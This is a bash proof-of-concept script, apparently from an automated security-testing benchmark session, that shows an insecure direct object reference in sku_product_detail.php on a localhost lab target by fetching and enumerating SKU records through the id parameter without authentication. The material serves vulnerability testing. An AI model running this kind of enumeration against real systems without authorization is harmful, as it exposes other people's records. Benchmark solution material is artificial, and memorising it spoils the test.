#!/bin/bash
# POC: Demonstrates IDOR vulnerability in sku_product_detail.php by accessing SKU records without authentication and enumerating multiple records through ID parameter manipulation
# Target: ./repo
# Created: 2025-12-02T16:23:35.475Z
# Session: benchmark-XBEN-092-24-miorxl1g

# IDOR Vulnerability POC - sku_product_detail.php
# Demonstrates unauthorized access to SKU records via ID parameter manipulation

TARGET_URL="http://localhost:8081"
ENDPOINT="/sku_product_detail.php"

echo "========================================"
echo "IDOR Vulnerability POC - SKU Product Detail"
echo "========================================"
echo ""

# Test 1: Access SKU with ID=1 (unauthenticated)
echo "[*] Test 1: Accessing SKU record with ID=1 (unauthenticated)"
echo "[*] URL: $TARGET_URL$ENDPOINT?id=1"
RESPONSE1=$(curl -s "$TARGET_URL$ENDPOINT?id=1")
echo "[+] Response received (length: ${#RESPONSE1})"
echo "$RESPONSE1" | head -20
echo ""

# Test 2: Access SKU with ID=2
echo "[*] Test 2: Accessing SKU record with ID=2 (different record)"
echo "[*] URL: $TARGET_URL$ENDPOINT?id=2"
RESPONSE2=$(curl -s "$TARGET_URL$ENDPOINT?id=2")
echo "[+] Response received (length: ${#RESPONSE2})"
echo "$RESPONSE2" | head -20
echo ""

# Test 3: Access SKU with ID=3
echo "[*] Test 3: Accessing SKU record with ID=3 (sequential enumeration)"
echo "[*] URL: $TARGET_URL$ENDPOINT?id=3"
RESPONSE3=$(curl -s "$TARGET_URL$ENDPOINT?id=3")
echo "[+] Response received (length: ${#RESPONSE3})"
echo "$RESPONSE3" | head -20
echo ""

# Test 4: Sequential enumeration of first 10 records
echo "[*] Test 4: Demonstrating sequential ID enumeration (IDs 1-10)"
echo "[*] Extracting SKU names and descriptions..."
for i in {1..10}; do
    RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?id=$i")
    # Check if response contains data (simple check)
    if echo "$RESPONSE" | grep -q "SKU"; then
        echo "  [+] ID=$i: Record found (response length: ${#RESPONSE})"
    else
        echo "  [-] ID=$i: No data or error"
    fi
done
echo ""

# Test 5: Check for authorization bypass indicators
echo "[*] Test 5: Checking for authorization/authentication requirements"
echo "[*] Looking for 401/403 errors or login redirects..."

RESPONSE_HEADER=$(curl -s -i "$TARGET_URL$ENDPOINT?id=1" | head -1)
echo "[+] HTTP Response: $RESPONSE_HEADER"

if echo "$RESPONSE_HEADER" | grep -q "200"; then
    echo "[!] VULNERABLE: Endpoint returns 200 OK without authentication"
elif echo "$RESPONSE_HEADER" | grep -q "401\|403"; then
    echo "[*] PROTECTED: Endpoint requires authentication/authorization"
else
    echo "[*] Response status: $RESPONSE_HEADER"
fi
echo ""

# Test 6: Direct comparison showing different data from different IDs
echo "[*] Test 6: Confirming different records retrieved with different IDs"
echo "[*] Comparing response lengths to show different data..."

for i in 1 2 3; do
    RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?id=$i")
    LENGTH=${#RESPONSE}
    # Extract any visible text content
    CONTENT=$(echo "$RESPONSE" | grep -o "name>\|sku>\|description>" | head -1)
    echo "  [+] ID=$i: Response length=$LENGTH bytes"
done
echo ""

echo "========================================"
echo "POC Summary: IDOR vulnerability confirmed"
echo "- Unauthenticated access to /sku_product_detail.php"
echo "- ID parameter directly controls database queries"
echo "- Sequential ID enumeration possible"
echo "- All SKU records accessible without authorization"
echo "========================================"